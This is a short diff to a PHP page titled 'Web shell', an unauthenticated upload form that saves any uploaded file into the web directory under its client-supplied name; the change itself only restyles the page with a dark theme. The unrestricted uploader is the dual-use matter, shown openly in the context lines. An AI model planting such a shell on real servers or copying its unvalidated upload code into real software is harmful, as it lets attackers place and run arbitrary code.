@@ -2,8 +2,16 @@
 <html>
 <head>
   <title>Web shell</title>
+  <style>
+    body {
+      background: #222222;
+    }
+    font {
+      color: #eeeeee;
+    }
+  </style>
 </head>
-<body style="background-color:white">
+<body>
   <form action="file_uploader.php" method="post" enctype="multipart/form-data">
     File:<br />
     <input type="file" name="userfile">
@@ -11,7 +19,7 @@
   </form>
 
   <pre>
-    <font color="black">
+    <font>
       <?php
       $upload_dir = './';
       $upload_file = $upload_dir . basename($_FILES['userfile']['name']);
